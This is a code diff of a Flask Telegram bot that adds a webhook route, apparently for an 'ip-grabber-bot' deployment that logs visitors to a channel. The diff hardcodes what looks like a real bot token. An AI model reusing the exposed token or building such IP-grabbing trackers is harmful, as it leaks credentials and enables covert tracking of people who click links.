@@ -5,10 +5,16 @@ from datetime import datetime
 
 app = Flask(__name__)
 
-# === YOUR CREDENTIALS (HARDCODED) ===
 BOT_TOKEN = "8659783782:AAFDtOxRHrZn-0CRdi-qk6ZsspjJXDLjxgg"
 LOG_CHANNEL = "-1001234567890123"
-# =====================================
+WEBHOOK_URL = "https://ip-grabber-bot-production.up.railway.app/webhook"
+
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    update = request.get_json()
+    # Kirim update ke bot handler
+    bot.process_new_updates([telebot.types.Update.de_json(update)])
+    return "OK", 200
 
 @app.route('/verify')
 def verify():
